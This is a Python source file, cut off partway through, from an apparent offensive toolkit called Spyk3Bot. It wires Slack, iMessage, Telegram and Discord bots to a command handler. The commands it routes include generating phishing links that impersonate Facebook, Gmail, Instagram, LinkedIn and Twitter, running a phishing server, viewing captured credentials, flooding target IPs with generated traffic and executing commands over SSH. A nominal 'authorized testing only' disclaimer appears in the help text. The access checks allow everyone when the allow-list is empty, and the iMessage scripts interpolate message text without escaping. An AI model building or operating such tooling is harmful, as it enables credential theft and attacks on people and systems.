class Spyk3BotSlack:
    """Slack bot integration"""
    
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = {}
        self.client = None
        self.running = False
        self.monitoring_thread = None
        self.allowed_users = []
        self.prefix = "!"
    
    def load_config(self) -> Dict:
        try:
            if os.path.exists(SLACK_CONFIG_FILE):
                with open(SLACK_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Slack config: {e}")
        return {}
    
    def save_config(self, bot_token: str = "", app_token: str = "", 
                   channel_id: str = "", enabled: bool = True,
                   prefix: str = "!", allowed_users: List[str] = None) -> bool:
        try:
            config = {
                "enabled": enabled,
                "bot_token": bot_token,
                "app_token": app_token,
                "channel_id": channel_id,
                "command_prefix": prefix,
                "allowed_users": allowed_users or []
            }
            with open(SLACK_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            self.prefix = prefix
            self.allowed_users = allowed_users or []
            return True
        except Exception as e:
            logger.error(f"Failed to save Slack config: {e}")
            return False
    
    def add_allowed_user(self, user_id: str) -> bool:
        if user_id not in self.allowed_users:
            self.allowed_users.append(user_id)
            self.save_config(
                self.config.get('bot_token', ''),
                self.config.get('app_token', ''),
                self.config.get('channel_id', ''),
                self.config.get('enabled', True),
                self.config.get('command_prefix', '!'),
                self.allowed_users
            )
            return True
        return False
    
    def remove_allowed_user(self, user_id: str) -> bool:
        if user_id in self.allowed_users:
            self.allowed_users.remove(user_id)
            self.save_config(
                self.config.get('bot_token', ''),
                self.config.get('app_token', ''),
                self.config.get('channel_id', ''),
                self.config.get('enabled', True),
                self.config.get('command_prefix', '!'),
                self.allowed_users
            )
            return True
        return False
    
    def is_user_allowed(self, user_id: str) -> bool:
        if not self.allowed_users:
            return True
        return user_id in self.allowed_users
    
    def start(self):
        if not SLACK_AVAILABLE:
            logger.error("Slack SDK not installed")
            return False
        
        if not self.config.get('bot_token'):
            logger.error("Slack bot token not configured")
            return False
        
        try:
            self.client = WebClient(token=self.config['bot_token'])
            
            response = self.client.auth_test()
            if not response['ok']:
                logger.error("Slack authentication failed")
                return False
            
            self.running = True
            self.monitoring_thread = threading.Thread(target=self._monitor_slack, daemon=True)
            self.monitoring_thread.start()
            
            logger.info("Slack bot started")
            return True
        except Exception as e:
            logger.error(f"Failed to start Slack bot: {e}")
            return False
    
    def stop(self):
        self.running = False
        if self.monitoring_thread:
            self.monitoring_thread.join(timeout=5)
        logger.info("Slack bot stopped")
    
    def _monitor_slack(self):
        while self.running:
            try:
                if self.config.get('channel_id'):
                    response = self.client.conversations_history(
                        channel=self.config['channel_id'],
                        limit=10
                    )
                    
                    if response['ok']:
                        for message in response['messages']:
                            if 'text' in message and 'user' in message:
                                text = message['text']
                                user = message['user']
                                
                                if text.startswith(self.prefix):
                                    if self.is_user_allowed(user):
                                        cmd = text[len(self.prefix):].strip()
                                        response_text = self._process_command(cmd, user)
                                        self._send_message(response_text)
                
                time.sleep(5)
            except Exception as e:
                logger.error(f"Slack monitoring error: {e}")
                time.sleep(10)
    
    def _process_command(self, command: str, user: str) -> str:
        try:
            user_info = self.client.users_info(user=user)
            user_name = user_info['user']['name'] if user_info['ok'] else user
        except:
            user_name = user
        
        result = self.handler.execute(command, f"slack ({user_name})")
        
        if result['success']:
            output = result.get('output', '') or result.get('data', '')
            if isinstance(output, dict):
                output = json.dumps(output, indent=2)
            return f"✅ Command Executed ({result['execution_time']:.2f}s)\n```{output}```"
        else:
            return f"❌ Command Failed: {result.get('output', 'Unknown error')}"
    
    def _send_message(self, message: str):
        try:
            if self.config.get('channel_id'):
                self.client.chat_postMessage(
                    channel=self.config['channel_id'],
                    text=message
                )
        except Exception as e:
            logger.error(f"Error sending Slack message: {e}")
    
    def send_alert(self, message: str):
        if not self.running:
            return
        self._send_message(f"🚨 *Spyk3Bot Security Alert*\n\n{message}")
    
    def start_bot_thread(self) -> bool:
        if self.config.get('enabled') and self.config.get('bot_token'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            logger.info("Slack bot started in background thread")
            return True
        return False

# =====================
# IMESSAGE BOT
# =====================
class Spyk3BotIMessage:
    """iMessage bot integration (macOS only) using AppleScript"""
    
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = {}
        self.running = False
        self.monitoring_thread = None
        self.allowed_numbers = []
        self.watched_numbers = []
        self.prefix = "!"
    
    def load_config(self) -> Dict:
        try:
            if os.path.exists(IMESSAGE_CONFIG_FILE):
                with open(IMESSAGE_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load iMessage config: {e}")
        return {}
    
    def save_config(self, phone_numbers: List[str] = None, enabled: bool = True,
                   prefix: str = "!", allowed_numbers: List[str] = None) -> bool:
        try:
            config = {
                "enabled": enabled,
                "phone_numbers": phone_numbers or [],
                "command_prefix": prefix,
                "allowed_numbers": allowed_numbers or []
            }
            with open(IMESSAGE_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            self.prefix = prefix
            self.allowed_numbers = allowed_numbers or []
            self.watched_numbers = phone_numbers or []
            return True
        except Exception as e:
            logger.error(f"Failed to save iMessage config: {e}")
            return False
    
    def add_allowed_number(self, phone_number: str) -> bool:
        if phone_number not in self.allowed_numbers:
            self.allowed_numbers.append(phone_number)
            self.save_config(
                self.config.get('phone_numbers', []),
                self.config.get('enabled', True),
                self.config.get('command_prefix', '!'),
                self.allowed_numbers
            )
            return True
        return False
    
    def remove_allowed_number(self, phone_number: str) -> bool:
        if phone_number in self.allowed_numbers:
            self.allowed_numbers.remove(phone_number)
            self.save_config(
                self.config.get('phone_numbers', []),
                self.config.get('enabled', True),
                self.config.get('command_prefix', '!'),
                self.allowed_numbers
            )
            return True
        return False
    
    def add_watched_number(self, phone_number: str) -> bool:
        if phone_number not in self.watched_numbers:
            self.watched_numbers.append(phone_number)
            self.save_config(
                self.watched_numbers,
                self.config.get('enabled', True),
                self.config.get('command_prefix', '!'),
                self.allowed_numbers
            )
            return True
        return False
    
    def remove_watched_number(self, phone_number: str) -> bool:
        if phone_number in self.watched_numbers:
            self.watched_numbers.remove(phone_number)
            self.save_config(
                self.watched_numbers,
                self.config.get('enabled', True),
                self.config.get('command_prefix', '!'),
                self.allowed_numbers
            )
            return True
        return False
    
    def is_number_allowed(self, number: str) -> bool:
        if not self.allowed_numbers:
            return True
        return number in self.allowed_numbers
    
    def check_imessage_available(self) -> bool:
        if not IMESSAGE_AVAILABLE:
            return False
        
        try:
            result = subprocess.run(
                ['osascript', '-e', 'tell application "System Events" to (name of processes) contains "Messages"'],
                capture_output=True,
                text=True,
                timeout=5
            )
            return 'true' in result.stdout.lower()
        except:
            return False
    
    def start(self):
        if not IMESSAGE_AVAILABLE:
            logger.error("iMessage only available on macOS")
            return False
        
        if not self.config.get('enabled'):
            logger.info("iMessage bot is disabled")
            return False
        
        try:
            if not self.check_imessage_available():
                subprocess.run(['open', '-a', 'Messages'])
                time.sleep(5)
            
            self.running = True
            self.monitoring_thread = threading.Thread(target=self._monitor_imessage, daemon=True)
            self.monitoring_thread.start()
            
            logger.info("iMessage bot started")
            return True
        except Exception as e:
            logger.error(f"Failed to start iMessage bot: {e}")
            return False
    
    def stop(self):
        self.running = False
        if self.monitoring_thread:
            self.monitoring_thread.join(timeout=5)
        logger.info("iMessage bot stopped")
    
    def _monitor_imessage(self):
        last_checked = {}
        
        while self.running:
            try:
                for number in self.watched_numbers:
                    messages = self._get_messages_from_number(number, last_checked.get(number))
                    
                    for msg in messages:
                        text = msg['text']
                        timestamp = msg['timestamp']
                        
                        if text.startswith(self.prefix):
                            if self.is_number_allowed(number):
                                cmd = text[len(self.prefix):].strip()
                                response = self._process_command(cmd, number)
                                self._send_message(number, response)
                    
                    if messages:
                        last_checked[number] = messages[0]['timestamp']
                
                time.sleep(5)
            except Exception as e:
                logger.error(f"iMessage monitoring error: {e}")
                time.sleep(10)
    
    def _get_messages_from_number(self, phone_number: str, since: float = None) -> List[Dict]:
        messages = []
        
        try:
            script = f'''
            tell application "Messages"
                set targetService to 1st service whose service type = iMessage
                set targetBuddy to buddy "{phone_number}" of targetService
                set recentMessages to messages of targetBuddy
                set messageList to {{}}
                repeat with i from 1 to count of recentMessages
                    if i > 10 then exit repeat
                    set msg to item i of recentMessages
                    set end of messageList to {{text:content of msg, timestamp:date of msg}}
                end repeat
                return messageList
            end tell
            '''
            
            result = subprocess.run(
                ['osascript', '-e', script],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0 and result.stdout:
                lines = result.stdout.strip().split(', ')
                for line in lines:
                    if ':' in line:
                        messages.append({'text': line, 'timestamp': time.time()})
        except Exception as e:
            logger.error(f"Error getting iMessages: {e}")
        
        return messages
    
    def _process_command(self, command: str, sender: str) -> str:
        result = self.handler.execute(command, f"imessage ({sender})")
        
        if result['success']:
            output = result.get('output', '') or result.get('data', '')
            if isinstance(output, dict):
                output = json.dumps(output, indent=2)
            return f"✅ Command Executed ({result['execution_time']:.2f}s)\n\n{output}"
        else:
            return f"❌ Command Failed: {result.get('output', 'Unknown error')}"
    
    def _send_message(self, recipient: str, message: str):
        try:
            script = f'''
            tell application "Messages"
                set targetService to 1st service whose service type = iMessage
                set targetBuddy to buddy "{recipient}" of targetService
                send "{message}" to targetBuddy
            end tell
            '''
            
            subprocess.run(
                ['osascript', '-e', script],
                capture_output=True,
                timeout=10
            )
        except Exception as e:
            logger.error(f"Error sending iMessage: {e}")
    
    def send_alert(self, message: str, recipient: str = None):
        if not self.running:
            return
        
        if recipient:
            self._send_message(recipient, f"🚨 Spyk3Bot Security Alert\n\n{message}")
        else:
            for number in self.watched_numbers:
                self._send_message(number, f"🚨 Spyk3Bot Security Alert\n\n{message}")
    
    def start_bot_thread(self) -> bool:
        if self.config.get('enabled') and IMESSAGE_AVAILABLE:
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            logger.info("iMessage bot started in background thread")
            return True
        return False

# =====================
# TELEGRAM BOT
# =====================
class Spyk3BotTelegram:
    """Telegram bot integration"""
    
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = {}
        self.client = None
        self.running = False
    
    def load_config(self) -> Dict:
        try:
            if os.path.exists(TELEGRAM_CONFIG_FILE):
                with open(TELEGRAM_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Telegram config: {e}")
        return {}
    
    def save_config(self, api_id: str = "", api_hash: str = "", bot_token: str = "",
                   phone_number: str = "", channel_id: str = "", enabled: bool = True) -> bool:
        try:
            config = {
                "api_id": api_id,
                "api_hash": api_hash,
                "bot_token": bot_token,
                "phone_number": phone_number,
                "channel_id": channel_id,
                "enabled": enabled
            }
            with open(TELEGRAM_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Telegram config: {e}")
            return False
    
    async def start(self):
        if not TELETHON_AVAILABLE:
            logger.error("Telethon not installed")
            return False
        
        if not self.config.get('api_id') or not self.config.get('api_hash'):
            logger.error("Telegram API credentials not configured")
            return False
        
        try:
            self.client = TelegramClient(
                'spyk3bot_session',
                self.config['api_id'],
                self.config['api_hash']
            )
            
            @self.client.on(events.NewMessage(pattern=r'^/(start|help|time|date|datetime|history|time_history|ping|scan|quick_scan|nmap|traceroute|whois|dns|location|analyze|system|status|threats|report|add_ip|remove_ip|block_ip|unblock_ip|list_ips|ip_info|ssh|ssh_add|ssh_list|ssh_connect|ssh_exec|ssh_upload|ssh_download|ssh_disconnect|generate_traffic|traffic_types|traffic_status|traffic_stop|traffic_logs|traffic_help|nikto|nikto_full|nikto_ssl|nikto_sql|nikto_xss|nikto_cgi|nikto_status|nikto_results|crunch|crunch_generate|crunch_list|crunch_info|crunch_delete|crunch_charsets|whatsapp_config|whatsapp_allow|whatsapp_disallow|signal_config|signal_allow|signal_disallow|signal_register|slack_config|slack_allow|slack_disallow|imessage_config|imessage_allow|imessage_disallow|generate_phishing_link_for_facebook|generate_phishing_link_for_instagram|generate_phishing_link_for_twitter|generate_phishing_link_for_gmail|generate_phishing_link_for_linkedin|generate_phishing_link_for_custom|phishing_start_server|phishing_stop_server|phishing_status|phishing_links|phishing_credentials|phishing_qr|phishing_shorten)'))
            async def handler(event):
                await self.handle_command(event)
            
            if self.config.get('bot_token'):
                await self.client.start(bot_token=self.config['bot_token'])
                logger.info("Telegram bot started (bot mode)")
            else:
                await self.client.start(phone=self.config.get('phone_number', ''))
                logger.info("Telegram bot started (user mode)")
            
            self.running = True
            await self.client.run_until_disconnected()
            
            return True
        except Exception as e:
            logger.error(f"Failed to start Telegram bot: {e}")
            return False
    
    async def handle_command(self, event):
        message = event.message.message
        sender = await event.get_sender()
        
        if not message.startswith('/'):
            return
        
        command_parts = message.split()
        command = command_parts[0][1:]
        args = command_parts[1:] if len(command_parts) > 1 else []
        
        logger.info(f"Telegram command from {sender.username}: {command}")
        
        cmd_map = {
            'start': 'help',
            'help': 'help',
            'time': 'time',
            'date': 'date',
            'datetime': 'datetime',
            'history': f"history {' '.join(args)}" if args else 'history',
            'time_history': f"time_history {' '.join(args)}" if args else 'time_history',
            'ping': f"ping {' '.join(args)}",
            'scan': f"scan {' '.join(args)}",
            'quick_scan': f"quick_scan {' '.join(args)}",
            'nmap': f"nmap {' '.join(args)}",
            'traceroute': f"traceroute {' '.join(args)}",
            'whois': f"whois {' '.join(args)}",
            'dns': f"dns {' '.join(args)}",
            'location': f"location {' '.join(args)}",
            'analyze': f"analyze {' '.join(args)}",
            'system': 'system',
            'status': 'status',
            'threats': 'threats',
            'report': 'report',
            'add_ip': f"add_ip {' '.join(args)}",
            'remove_ip': f"remove_ip {' '.join(args)}",
            'block_ip': f"block_ip {' '.join(args)}",
            'unblock_ip': f"unblock_ip {' '.join(args)}",
            'list_ips': 'list_ips',
            'ip_info': f"ip_info {' '.join(args)}",
            'ssh': f"ssh {' '.join(args)}",
            'ssh_add': f"ssh_add {' '.join(args)}",
            'ssh_list': 'ssh_list',
            'ssh_connect': f"ssh_connect {' '.join(args)}",
            'ssh_exec': f"ssh_exec {' '.join(args)}",
            'ssh_upload': f"ssh_upload {' '.join(args)}",
            'ssh_download': f"ssh_download {' '.join(args)}",
            'ssh_disconnect': f"ssh_disconnect {' '.join(args)}",
            'generate_traffic': f"generate_traffic {' '.join(args)}",
            'traffic_types': 'traffic_types',
            'traffic_status': 'traffic_status',
            'traffic_stop': f"traffic_stop {' '.join(args)}",
            'traffic_logs': f"traffic_logs {' '.join(args)}",
            'traffic_help': 'traffic_help',
            'nikto': f"nikto {' '.join(args)}",
            'nikto_full': f"nikto_full {' '.join(args)}",
            'nikto_ssl': f"nikto_ssl {' '.join(args)}",
            'nikto_sql': f"nikto_sql {' '.join(args)}",
            'nikto_xss': f"nikto_xss {' '.join(args)}",
            'nikto_cgi': f"nikto_cgi {' '.join(args)}",
            'nikto_status': 'nikto_status',
            'nikto_results': 'nikto_results',
            'crunch': f"crunch {' '.join(args)}" if args else 'crunch',
            'crunch_generate': f"crunch_generate {' '.join(args)}",
            'crunch_list': 'crunch_list',
            'crunch_info': f"crunch_info {' '.join(args)}",
            'crunch_delete': f"crunch_delete {' '.join(args)}",
            'crunch_charsets': 'crunch_charsets',
            'whatsapp_config': f"whatsapp_config {' '.join(args)}",
            'whatsapp_allow': f"whatsapp_allow {' '.join(args)}",
            'whatsapp_disallow': f"whatsapp_disallow {' '.join(args)}",
            'signal_config': f"signal_config {' '.join(args)}",
            'signal_allow': f"signal_allow {' '.join(args)}",
            'signal_disallow': f"signal_disallow {' '.join(args)}",
            'signal_register': 'signal_register',
            'slack_config': f"slack_config {' '.join(args)}",
            'slack_allow': f"slack_allow {' '.join(args)}",
            'slack_disallow': f"slack_disallow {' '.join(args)}",
            'imessage_config': f"imessage_config {' '.join(args)}",
            'imessage_allow': f"imessage_allow {' '.join(args)}",
            'imessage_disallow': f"imessage_disallow {' '.join(args)}",
            'generate_phishing_link_for_facebook': 'generate_phishing_link_for_facebook',
            'generate_phishing_link_for_instagram': 'generate_phishing_link_for_instagram',
            'generate_phishing_link_for_twitter': 'generate_phishing_link_for_twitter',
            'generate_phishing_link_for_gmail': 'generate_phishing_link_for_gmail',
            'generate_phishing_link_for_linkedin': 'generate_phishing_link_for_linkedin',
            'generate_phishing_link_for_custom': f"generate_phishing_link_for_custom {' '.join(args)}" if args else 'generate_phishing_link_for_custom',
            'phishing_start_server': f"phishing_start_server {' '.join(args)}" if args else 'phishing_start_server',
            'phishing_stop_server': 'phishing_stop_server',
            'phishing_status': 'phishing_status',
            'phishing_links': 'phishing_links',
            'phishing_credentials': f"phishing_credentials {' '.join(args)}" if args else 'phishing_credentials',
            'phishing_qr': f"phishing_qr {' '.join(args)}" if args else 'phishing_qr',
            'phishing_shorten': f"phishing_shorten {' '.join(args)}" if args else 'phishing_shorten'
        }
        
        if command in cmd_map:
            handler_cmd = cmd_map[command]
            if command in ['start', 'help']:
                await self.send_help(event)
            else:
                processing_msg = await event.reply(f"🔄 Processing {command}...")
                result = self.handler.execute(handler_cmd, "telegram")
                await self.send_result(event, result, processing_msg)
    
    async def send_help(self, event):
        help_text = """
🕷️ *Spyk3 Bot v10.0.0 - Telegram Commands*

*⏰ TIME & DATE COMMANDS:*
`/time` - Show current time
`/date` - Show current date
`/datetime` - Show both date and time
`/history [limit]` - View command history
`/time_history` - View time command history

*🔌 SSH COMMANDS:*
`/ssh_add <name> <host> <user> [password] [port]` - Add SSH server
`/ssh_list` - List configured SSH servers
`/ssh_connect <server_id>` - Connect to SSH server
`/ssh_exec <server_id> <command>` - Execute command on remote server
`/ssh_upload <server_id> <local> <remote>` - Upload file
`/ssh_download <server_id> <remote> <local>` - Download file
`/ssh_disconnect <server_id>` - Disconnect from server

*🚀 TRAFFIC GENERATION:*
`/generate_traffic <type> <ip> <duration> [port] [rate]` - Generate real traffic
`/traffic_types` - List available traffic types
`/traffic_status` - Check active generators
`/traffic_stop [id]` - Stop traffic generation
`/traffic_logs [limit]` - View traffic logs
`/traffic_help` - Traffic generation help

*🕷️ NIKTO WEB SCANNER:*
`/nikto <target>` - Basic web vulnerability scan
`/nikto_full <target>` - Full scan with all tests
`/nikto_ssl <target>` - SSL/TLS specific scan
`/nikto_sql <target>` - SQL injection scan
`/nikto_xss <target>` - XSS scan
`/nikto_cgi <target>` - CGI scan
`/nikto_status` - Check scanner status
`/nikto_results` - View recent scans

*🔐 CRUNCH WORDLIST GENERATOR:*
`/crunch_generate <name> <min> <max> [pattern] [charset]` - Generate wordlist
`/crunch_list` - List generated wordlists
`/crunch_info <id>` - Show wordlist details
`/crunch_delete <id>` - Delete wordlist
`/crunch_charsets` - Show available charsets

*🎣 SOCIAL ENGINEERING:*
`/generate_phishing_link_for_facebook` - Facebook phishing link
`/generate_phishing_link_for_instagram` - Instagram phishing link
`/generate_phishing_link_for_twitter` - Twitter phishing link
`/generate_phishing_link_for_gmail` - Gmail phishing link
`/generate_phishing_link_for_linkedin` - LinkedIn phishing link
`/generate_phishing_link_for_custom [url]` - Custom phishing link
`/phishing_start_server <id> [port]` - Start phishing server
`/phishing_stop_server` - Stop phishing server
`/phishing_status` - Check server status
`/phishing_links` - List all phishing links
`/phishing_credentials [id]` - View captured credentials
`/phishing_qr <id>` - Generate QR code
`/phishing_shorten <id>` - Shorten URL

*🔒 IP MANAGEMENT:*
`/add_ip <ip> [notes]` - Add IP to monitoring
`/remove_ip <ip>` - Remove IP from monitoring
`/block_ip <ip> [reason]` - Block IP address
`/unblock_ip <ip>` - Unblock IP address
`/list_ips` - List managed IPs
`/ip_info <ip>` - Detailed IP information

*🛡️ NETWORK COMMANDS:*
`/ping <ip>` - Ping an IP address
`/scan <ip>` - Scan ports 1-1000
`/quick_scan <ip>` - Quick port scan
`/nmap <ip> [options]` - Full nmap scan
`/traceroute <target>` - Network path tracing

*📱 MESSAGING PLATFORMS:*
`/whatsapp_config <phone> [prefix]` - Configure WhatsApp
`/whatsapp_allow <phone>` - Allow WhatsApp contact
`/signal_config <phone> [prefix]` - Configure Signal
`/signal_allow <phone>` - Allow Signal number
`/signal_register` - Register Signal device
`/slack_config <token> [channel]` - Configure Slack
`/slack_allow <user>` - Allow Slack user
`/imessage_config [numbers]` - Configure iMessage
`/imessage_allow <number>` - Allow iMessage number

*Examples:*
`/time`
`/date`
`/ping 8.8.8.8`
`/ssh_add myserver 192.168.1.100 root password123`
`/ssh_exec myserver "ls -la"`
`/generate_traffic icmp 192.168.1.1 10`
`/nikto example.com`
`/crunch_generate passwords 8 12 alphanum`
`/crunch_list`
`/generate_phishing_link_for_facebook`
`/phishing_start_server abc12345 8080`
`/add_ip 192.168.1.100 Suspicious`
`/block_ip 10.0.0.5 Port scanning`

⚠️ *For authorized security testing only*
        """
        await event.reply(help_text, parse_mode='markdown')
    
    async def send_result(self, event, result, processing_msg=None):
        if processing_msg:
            try:
                await processing_msg.delete()
            except:
                pass
        
        if not result['success']:
            error_msg = f"❌ *Command Failed*\n\n```{result.get('output', 'Unknown error')[:1000]}```"
            await event.reply(error_msg, parse_mode='markdown')
            return
        
        output = result.get('output', '') or result.get('data', '')
        
        if isinstance(output, dict):
            try:
                formatted = json.dumps(output, indent=2)
            except:
                formatted = str(output)
        else:
            formatted = str(output)
        
        if len(formatted) > 4000:
            formatted = formatted[:3900] + "\n\n... (output truncated)"
        
        success_msg = f"✅ *Command Executed* ({result['execution_time']:.2f}s)\n\n```{formatted}```"
        await event.reply(success_msg, parse_mode='markdown')
    
    def start_bot_thread(self):
        if self.config.get('enabled') and (self.config.get('api_id') or self.config.get('bot_token')):
            thread = threading.Thread(target=self._run_telegram_bot, daemon=True)
            thread.start()
            logger.info("Telegram bot started in background thread")
            return True
        return False
    
    def _run_telegram_bot(self):
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# =====================
# DISCORD BOT
# =====================
class Spyk3BotDiscord:
    """Discord bot integration with all commands"""
    
    def __init__(self, command_handler, db: DatabaseManager, monitor: NetworkMonitor):
        self.handler = command_handler
        self.db = db
        self.monitor = monitor
        self.config = {}
        self.bot = None
        self.running = False
    
    def load_config(self) -> Dict:
        try:
            if os.path.exists(DISCORD_CONFIG_FILE):
                with open(DISCORD_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Discord config: {e}")
        return {}
    
    def save_config(self, token: str, channel_id: str = "", enabled: bool = True, 
                   prefix: str = "!", admin_role: str = "Admin", security_role: str = "Security Team") -> bool:
        try:
            config = {
                "enabled": enabled,
                "token": token,
                "channel_id": channel_id,
                "prefix": prefix,
                "admin_role": admin_role,
                "security_role": security_role
            }
            with open(DISCORD_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            logger.info("Discord configuration saved successfully")
            return True
        except Exception as e:
            logger.error(f"Failed to save Discord config: {e}")
            return False
    
    async def start(self):
        if not DISCORD_AVAILABLE:
            logger.error("discord.py not installed")
            return False
        
        if not self.config.get('token'):
            logger.error("Discord token not configured")
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            intents.members = True
            
            self.bot = commands.Bot(
                command_prefix=self.config.get('prefix', '!'), 
                intents=intents,
                help_command=None
            )
            
            @self.bot.event
            async def on_ready():
                logger.info(f'Discord bot logged in as {self.bot.user}')
                
                await self.bot.change_presence(
                    activity=discord.Activity(
                        type=discord.ActivityType.watching,
                        name="2000+ Security Commands | !help"
                    )
                )
            
            await self.setup_commands()
            
            self.running = True
            await self.bot.start(self.config['token'])
            return True
        except Exception as e:
            logger.error(f"Failed to start Discord bot: {e}")
            return False
    
    async def setup_commands(self):
        """Setup Discord commands"""
        
        @self.bot.command(name='time')
        async def time_command(ctx):
            result = self.handler.execute("time", "discord")
            await ctx.send(f"🕐 {result.get('output', 'N/A')}")
        
        @self.bot.command(name='date')
        async def date_command(ctx):
            result = self.handler.execute("date", "discord")
            await ctx.send(f"📅 {result.get('output', 'N/A')}")
        
        @self.bot.command(name='datetime')
        async def datetime_command(ctx):
            result = self.handler.execute("datetime", "discord")
            await ctx.send(f"```{result.get('output', 'N/A')}```")
        
        @self.bot.command(name='history')
        async def history_command(ctx, limit: int = 10):
            result = self.handler.execute(f"history {limit}", "discord")
            if result['success']:
                output = result.get('output', 'No history found')
                if len(output) > 1900:
                    output = output[:1900] + "\n... (truncated)"
                await ctx.send(f"```{output}```")
            else:
                await ctx.send(f"❌ {result.get('output', 'Unknown error')}")
        
        @self.bot.command(name='time_history')
        async def time_history_command(ctx, limit: int = 10):
            result = self.handler.execute(f"time_history {limit}", "discord")
            if result['success']:
                output = result.get('output', 'No time history found')
                await ctx.send(f"```{output}```")
            else:
                await ctx.send(f"❌ {result.get('output', 'Unknown error')}")
        
        @self.bot.command(name='crunch')
        async def crunch_command(ctx, *args):
            if not await self.check_permissions(ctx):
                return
            cmd = "crunch"
            if args:
                cmd += " " + " ".join(args)
            result = self.handler.execute(cmd, "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='crunch_generate')
        async def crunch_generate_command(ctx, name: str, min_length: int, max_length: int, pattern: str = None, charset: str = None):
            if not await self.check_permissions(ctx):
                return
            cmd = f"crunch_generate {name} {min_length} {max_length}"
            if pattern:
                cmd += f" {pattern}"
            if charset:
                cmd += f" {charset}"
            await ctx.send(f"🔐 Generating wordlist '{name}'...")
            result = self.handler.execute(cmd, "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='crunch_list')
        async def crunch_list_command(ctx):
            result = self.handler.execute("crunch_list", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='crunch_info')
        async def crunch_info_command(ctx, wordlist_id: str):
            result = self.handler.execute(f"crunch_info {wordlist_id}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='crunch_delete')
        async def crunch_delete_command(ctx, wordlist_id: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute(f"crunch_delete {wordlist_id}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='crunch_charsets')
        async def crunch_charsets_command(ctx):
            result = self.handler.execute("crunch_charsets", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ssh_add')
        async def ssh_add_command(ctx, name: str, host: str, username: str, password: str = None, port: int = 22):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            notes = f"Added by {ctx.author.name}"
            result = self.handler.execute(f"ssh_add {name} {host} {username} {password or ''} {port} {notes}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ssh_list')
        async def ssh_list_command(ctx):
            if not await self.check_permissions(ctx):
                return
            result = self.handler.execute("ssh_list", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ssh_connect')
        async def ssh_connect_command(ctx, server_id: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            await ctx.send(f"🔌 Connecting to server {server_id}...")
            result = self.handler.execute(f"ssh_connect {server_id}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ssh_exec')
        async def ssh_exec_command(ctx, server_id: str, *, command: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            await ctx.send(f"💻 Executing command on {server_id}...")
            result = self.handler.execute(f"ssh_exec {server_id} {command}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ssh_upload')
        async def ssh_upload_command(ctx, server_id: str, local_path: str, remote_path: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            await ctx.send(f"📤 Uploading {local_path} to {server_id}:{remote_path}...")
            result = self.handler.execute(f"ssh_upload {server_id} {local_path} {remote_path}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ssh_download')
        async def ssh_download_command(ctx, server_id: str, remote_path: str, local_path: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            await ctx.send(f"📥 Downloading {server_id}:{remote_path} to {local_path}...")
            result = self.handler.execute(f"ssh_download {server_id} {remote_path} {local_path}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ssh_disconnect')
        async def ssh_disconnect_command(ctx, server_id: str = None):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute(f"ssh_disconnect {server_id}" if server_id else "ssh_disconnect", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_traffic')
        async def generate_traffic_command(ctx, traffic_type: str, target_ip: str, duration: int, port: str = None, rate: str = None):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            cmd = f"generate_traffic {traffic_type} {target_ip} {duration}"
            if port:
                cmd += f" {port}"
            if rate:
                cmd += f" {rate}"
            await ctx.send(f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration} seconds...")
            result = self.handler.execute(cmd, "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='traffic_types')
        async def traffic_types_command(ctx):
            result = self.handler.execute("traffic_types", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='traffic_status')
        async def traffic_status_command(ctx):
            result = self.handler.execute("traffic_status", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='traffic_stop')
        async def traffic_stop_command(ctx, generator_id: str = None):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            cmd = "traffic_stop"
            if generator_id:
                cmd += f" {generator_id}"
            result = self.handler.execute(cmd, "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='traffic_logs')
        async def traffic_logs_command(ctx, limit: int = 10):
            result = self.handler.execute(f"traffic_logs {limit}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='traffic_help')
        async def traffic_help_command(ctx):
